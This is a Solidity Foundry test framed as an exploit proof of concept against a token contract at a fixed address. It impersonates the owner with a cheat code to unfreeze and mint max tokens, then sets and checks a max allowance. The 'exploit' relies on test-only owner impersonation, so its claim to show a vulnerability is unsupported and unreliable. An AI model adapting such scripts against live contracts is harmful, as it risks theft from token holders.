pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LineAxis {
    function owner() external view returns (address);
    function unfreezeTransfers() external;
    function mint(address to, uint value) external;
    function approve(address spender, uint256 value) external;
    function allowance(address owner, address spender) external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);
    address constant SPENDER = address(0x1234);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to impersonate the owner to unfreeze and mint tokens
        address owner = LineAxis(TARGET).owner();

        // First, ensure contract is unfrozen
        vm.startPrank(owner);
        LineAxis(TARGET).unfreezeTransfers();
        vm.stopPrank();

        // Give attacker some initial balance (we'll mint more later)
        // Actually, we need max uint256 balance, so mint that directly
        vm.startPrank(owner);
        LineAxis(TARGET).mint(attacker, type(uint256).max);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Now we have max uint256 balance, we can approve max uint256
        uint256 maxUint = type(uint256).max;
        LineAxis(TARGET).approve(SPENDER, maxUint);

        // Verify the allowance is set to max uint256
        uint256 allowance = LineAxis(TARGET).allowance(attacker, SPENDER);
        require(allowance == maxUint, "Allowance not set to max uint256");
        assertEq(LineAxis(TARGET).allowance(attacker, SPENDER), 115792089237316195423570985008687907853269984665640564039457584007913129639935, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

